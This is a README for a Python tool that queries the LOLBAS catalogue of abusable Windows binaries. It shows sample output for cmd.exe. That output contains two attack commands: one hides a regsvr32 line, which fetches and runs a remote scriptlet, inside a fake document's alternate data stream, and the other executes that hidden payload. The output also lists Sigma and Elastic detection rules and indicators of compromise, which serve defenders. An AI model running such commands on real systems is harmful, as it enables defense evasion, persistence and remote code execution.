# LOLBAS.py

## Description
A Python script to query LOLBAS: https://lolbas-project.github.io/.

```
usage: LOLBAS.py [-h] -f FILE

A Python script to query LOLBAS: https://lolbas-project.github.io/.

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Query LOLBAS API for a specific file.
```

## Requirements
- Python ≥ 3.0

## Usage
- Download the LOLBAS repository: `git clone https://github.com/malwaredetective/LOLBAS.git`.
- Execute **LOLBAS.py** within your terminal: `python3 LOLBAS.py -f <string>` to query to LOLBAS API for a specific executable.

```
python3 LOLBAS.py -f cmd.exe     

Name : Cmd.exe
Description : The command-line interpreter in Windows
Author : Ye Yint Min Thu Htut
Created : 2019-06-26

Category: ADS
Description: Add content to an Alternate Data Stream (ADS).
Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
Privileges: User
OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
MitreID: T1059.003

Category: ADS
Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
Command: cmd.exe - < fakefile.doc:payload.bat
Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
Privileges: User
OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
MitreID: T1059.003

Path : C:\Windows\System32\cmd.exe
Path : C:\Windows\SysWOW64\cmd.exe

Sigma : https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml
Elastic : https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
Elastic : https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
IOC : cmd.exe executing files from alternate data streams.
IOC : cmd.exe creating/modifying file contents in an alternate data stream.

Link : https://twitter.com/yeyint_mth/status/1143824979139579904

url : https://lolbas-project.github.io/lolbas/Binaries/Cmd/
```
